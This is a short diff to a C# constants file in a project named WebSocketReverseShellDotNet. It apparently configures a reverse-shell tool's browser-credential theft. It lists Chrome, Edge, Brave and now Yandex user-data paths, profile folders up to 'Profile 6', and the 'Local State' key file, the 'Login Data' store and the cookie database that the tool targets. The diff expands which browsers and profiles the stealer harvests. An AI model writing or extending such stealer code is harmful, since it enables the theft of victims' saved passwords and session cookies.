@@ -65,8 +65,9 @@ namespace WebSocketReverseShellDotNet.utils
         public static string[] LIST_OF_BROWSER_LOCATIONS = [
             "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\",
             "%LOCALAPPDATA%\\Google\\Chrome SxS\\User Data\\",
-            "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data",
+            "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\",
             "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\",
+            "%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data\\",
         ];
 
         public static string ENCRYPTION_KEY_BROWSER_DB = "Local State";
@@ -78,6 +79,7 @@ namespace WebSocketReverseShellDotNet.utils
             "Profile 3\\",
             "Profile 4\\",
             "Profile 5\\",
+            "Profile 6\\",
         ];
         public static string LOGIN_DATA_BROWSER_DB = "Login Data";
         public static string COOKIES_BROWSER_DB = "Network\\Cookies";
